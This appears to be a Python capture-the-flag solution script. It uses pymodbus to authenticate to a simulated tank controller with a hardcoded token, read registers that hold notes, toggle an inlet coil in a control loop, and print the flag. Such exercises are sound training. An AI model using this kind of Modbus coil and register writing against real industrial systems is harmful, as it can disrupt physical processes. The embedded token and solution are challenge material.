import os
import time
from pymodbus.client import ModbusTcpClient

HOST, PORT, UNIT = "tankctf.robertkuschel.com", 502, 5
TOKEN = "872V83N5W6XT9PTF"

def text(regs):
    return bytes(b for r in regs for b in (r >> 8, r & 0xFF)).rstrip(b"\x00").decode()

c = ModbusTcpClient(HOST, port=PORT)
c.connect()

# Authenticate: token -> 16-bit registers -> holding register 1000
raw = TOKEN.encode().ljust(32, b"\x00")
regs = [(raw[i] << 8) | raw[i + 1] for i in range(0, 32, 2)]
c.write_registers(1000, regs, device_id=UNIT)

# Marcus's handover notes (readable even without authenticating) and the banner
print(text(c.read_holding_registers(200, count=125, device_id=UNIT).registers))
print(text(c.read_holding_registers(0, count=64, device_id=UNIT).registers))

# Control loop: inlet open while the level is below 500
inlet = None
while True:
    r = c.read_input_registers(0, count=3, device_id=UNIT)   # level, progress, status
    if r.isError():
        time.sleep(1)
        continue
    level, progress, status = r.registers
    print("level", level, "progress", progress, "status", status)
    if status == 3:
        break
    want = level < 500
    if want != inlet:
        c.write_coil(0, want, device_id=UNIT)
        inlet = want
    time.sleep(0.3)

c.write_coil(0, False, device_id=UNIT)
print("FLAG:", text(c.read_holding_registers(100, count=64, device_id=UNIT).registers))
c.close()
